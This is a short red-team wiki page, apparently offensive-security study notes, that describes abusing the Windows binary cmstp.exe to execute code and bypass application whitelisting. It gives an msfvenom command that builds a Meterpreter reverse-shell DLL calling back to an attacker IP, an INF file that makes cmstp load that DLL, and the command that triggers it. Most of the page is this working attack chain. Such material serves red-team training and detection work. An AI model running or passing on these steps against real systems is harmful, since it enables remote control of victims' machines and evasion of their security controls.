# CMSTP

## Theory 

Cmstp.exe is a windows binary that allow administrator to installs or removes a Connection Manager service profile. As a red teamer, we can abuse it to execute code and bypass application whitelisting.

## Practice

{% tabs %}
{% tab title="cmstp.exe" %}

First, generate a reverse shell as dll
```bash
v4resk@kali$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=443 -f dll > /root/tools/mitre/cmstp/evil.dll
```
Creating a file that will be loaded by CSMTP.exe binary that will in turn load our evil.dll:
```bash
#f.inf
[version]
Signature=$chicago$
AdvancedINF=2.5
 
[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection
 
[RegisterOCXSection]
C:\experiments\cmstp\evil.dll
 
[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="mantvydas"
ShortSvcName="mantvydas"
```

Now, we can invoke the payload:
```bash
PS C:\experiments\cmstp> cmstp.exe /s .\f.inf
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://tryhackme.com/room/livingofftheland" %}
{% embed url="https://www.ired.team/offensive-security/code-execution/t1191-cmstp-code-execution" %}
